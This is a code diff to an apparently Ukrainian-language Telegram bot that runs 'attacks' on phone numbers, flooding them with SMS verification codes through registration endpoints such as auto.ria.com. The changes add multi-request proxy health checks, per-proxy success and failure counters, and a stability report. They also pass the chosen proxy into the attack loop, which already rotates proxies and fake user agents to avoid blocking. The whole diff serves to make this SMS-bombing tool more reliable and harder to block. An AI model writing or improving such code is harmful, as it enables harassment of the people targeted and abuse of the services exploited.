@@ -119,6 +119,8 @@ proxies_last_check = None
 proxies_stats = []  # list of {entry, latency_ms}
 proxies_usage = {}  # key -> count
 proxies_usage_total = 0
+proxies_success = {}  # key -> count (успішні запити)
+proxies_failed = {}  # key -> count (неуспішні запити)
 
 last_status_msg = {}  # chat_id -> message_id
 
@@ -612,17 +614,51 @@ def proxy_key(entry):
     return f"{entry['host']}:{entry['port']}:{entry.get('user','')}"
 
 async def check_single_proxy(entry):
+    """
+    Перевіряє проксі, роблячи кілька запитів для визначення реальної стабільності.
+    Повертає середню затримку та кількість успішних запитів.
+    """
     proxy_url, proxy_auth = build_proxy_params(entry)
     if not proxy_url:
         return None
+    
+    # Робимо 3 запити для перевірки стабільності
+    test_url = "https://api.ipify.org?format=json"
+    success_count = 0
+    total_latency = 0.0
+    attempts = 3
+    
     try:
         timeout = aiohttp.ClientTimeout(total=5)
-        started = asyncio.get_event_loop().time()
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, proxy_auth=proxy_auth) as resp:
-                if resp.status == 200:
-                    latency = (asyncio.get_event_loop().time() - started) * 1000.0
-                    return {"entry": entry, "latency_ms": latency}
+        
+        for attempt in range(attempts):
+            try:
+                started = asyncio.get_event_loop().time()
+                async with aiohttp.ClientSession(timeout=timeout) as session:
+                    async with session.get(test_url, proxy=proxy_url, proxy_auth=proxy_auth) as resp:
+                        if resp.status == 200:
+                            latency = (asyncio.get_event_loop().time() - started) * 1000.0
+                            total_latency += latency
+                            success_count += 1
+                        else:
+                            # Неуспішний запит
+                            pass
+            except Exception:
+                # Помилка запиту - не рахуємо як успішний
+                pass
+            
+            # Невелика затримка між спробами
+            if attempt < attempts - 1:
+                await asyncio.sleep(0.3)
+        
+        # Проксі вважається робочим, якщо хоча б один запит успішний
+        if success_count > 0:
+            avg_latency = total_latency / success_count
+            return {
+                "entry": entry, 
+                "latency_ms": avg_latency,
+                "success_rate": success_count / attempts  # Стабільність від 0 до 1
+            }
     except Exception:
         return None
     return None
@@ -824,13 +860,30 @@ async def admin_check_and_report_proxies(message: Message):
     placeholder = await message.answer("Перевіряю проксі…")
     stats = await check_and_update_proxies()
     lines = [f"Перевірено: {stats['total']}. Робочих: {stats['healthy']}.", ""]
-    total_usage = sum(proxies_usage.values()) or 1
+    
     for item in proxies_stats:
         e = item["entry"]
-        key = f"{e['host']}:{e['port']}:{e['user']}"
-        cnt = proxies_usage.get(key, 0)
-        pct = round(cnt * 100.0 / total_usage, 1)
-        lines.append(f"• {e['host']}:{e['port']} ({e['user']}) — {int(item['latency_ms'])} ms — навантаження: {pct}%")
+        key = proxy_key(e)
+        
+        # Обчислюємо реальну стабільність на основі успішних/неуспішних запитів
+        success_count = proxies_success.get(key, 0)
+        failed_count = proxies_failed.get(key, 0)
+        total_requests = success_count + failed_count
+        
+        if total_requests > 0:
+            stability_pct = round((success_count / total_requests) * 100, 1)
+        else:
+            # Якщо немає реальних даних, використовуємо дані з перевірки
+            check_success_rate = item.get('success_rate', 1.0)
+            stability_pct = round(check_success_rate * 100, 1)
+        
+        latency_ms = int(item.get('latency_ms', 0))
+        lines.append(f"• {e['host']}:{e['port']} ({e['user']}) — {latency_ms} ms — Стабільність: {stability_pct}%")
+        
+        # Додаткова інформація про реальне використання
+        if total_requests > 0:
+            lines.append(f"  └ Успішних: {success_count}, Неуспішних: {failed_count} (всього: {total_requests})")
+    
     try:
         await bot.edit_message_text("\n".join(lines), chat_id=placeholder.chat.id, message_id=placeholder.message_id)
     except Exception:
@@ -1538,7 +1591,7 @@ async def send_request(url, data=None, json=None, headers=None, method='POST', c
         else:
             raise ValueError(f"Unsupported method {method}")
 
-async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
+async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None):
     headers = {"User-Agent": fake_useragent.UserAgent().random}
 
     csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
@@ -1679,6 +1732,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     async def send_request_and_log(url, **kwargs):
         method = kwargs.get('method', 'POST')
         start_time = asyncio.get_event_loop().time()
+        request_success = False
         
         try:
             if not attack_flags.get(chat_id):
@@ -1717,6 +1771,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
                     
                     # Детальне логування успішного запиту
                     if response.status == 200:
+                        request_success = True
                         # Перевіряємо чи відповідь містить ознаки успішної відправки SMS
                         sms_sent_indicators = ['sent', 'success', 'ок', 'успішно', 'sms', 'code sent', 'отправлено', 'отправлен', 'code', 'sms code', 'verification', 'подтверждение', 'підтвердження', 'отримано', 'получено', 'true', '"status"', '"success"', '"ok"', '"message"', '"result"']
                         response_lower = response_preview.lower()
@@ -1730,23 +1785,37 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
                             logging.info(f"[RESPONSE] {domain} | Відповідь (повна): {response_text[:1000] if len(response_text) > 1000 else response_text}")
                     # Детальне логування неуспішного запиту
                     else:
+                        request_success = False
                         logging.warning(f"[FAILED] {domain} | Статус: {response.status} | Час: {elapsed_time:.2f}s | Номер: {number}")
                         logging.debug(f"[RESPONSE] {domain} | Статус: {response.status} | Відповідь: {response_preview}")
                         
         except asyncio.TimeoutError:
+            request_success = False
             elapsed_time = asyncio.get_event_loop().time() - start_time
             domain = url.split('/')[2] if '/' in url else url
             logging.error(f"[TIMEOUT] {domain} | Час: {elapsed_time:.2f}s | URL: {url[:100]}... | Номер: {number}")
             
         except aiohttp.ClientError as e:
+            request_success = False
             elapsed_time = asyncio.get_event_loop().time() - start_time
             domain = url.split('/')[2] if '/' in url else url
             logging.error(f"[CLIENT_ERROR] {domain} | Час: {elapsed_time:.2f}s | Помилка: {str(e)} | URL: {url[:100]}... | Номер: {number}")
             
         except Exception as e:
+            request_success = False
             elapsed_time = asyncio.get_event_loop().time() - start_time
             domain = url.split('/')[2] if '/' in url else url
             logging.error(f"[ERROR] {domain} | Час: {elapsed_time:.2f}s | Помилка: {str(e)} | Тип: {type(e).__name__} | URL: {url[:100]}... | Номер: {number}")
+        
+        finally:
+            # Відстежуємо стабільність проксі на основі реальних результатів
+            if proxy_entry:
+                global proxies_success, proxies_failed
+                key = proxy_key(proxy_entry)
+                if request_success:
+                    proxies_success[key] = proxies_success.get(key, 0) + 1
+                else:
+                    proxies_failed[key] = proxies_failed.get(key, 0) + 1
 
     semaphore = asyncio.Semaphore(3)  # Зменшено до 3 одночасних запитів
 
@@ -1845,6 +1914,7 @@ async def start_attack(number, chat_id):
         # choose least-used proxy (then by lower latency) for the whole attack session
         p_url = None
         p_auth = None
+        best_entry = None
         if snapshot:
             try:
                 # map latency by key
@@ -1863,6 +1933,8 @@ async def start_attack(number, chat_id):
                 logging.info(f"Using proxy for attack: {best_entry['host']}:{best_entry['port']}")
             except Exception:
                 p_url, p_auth = None, None
+                best_entry = None
+        
         while (asyncio.get_event_loop().time() - start_time) < timeout:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
@@ -1874,7 +1946,7 @@ async def start_attack(number, chat_id):
                     pass
                 return
             
-            await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth)
+            await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth, proxy_entry=best_entry)
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
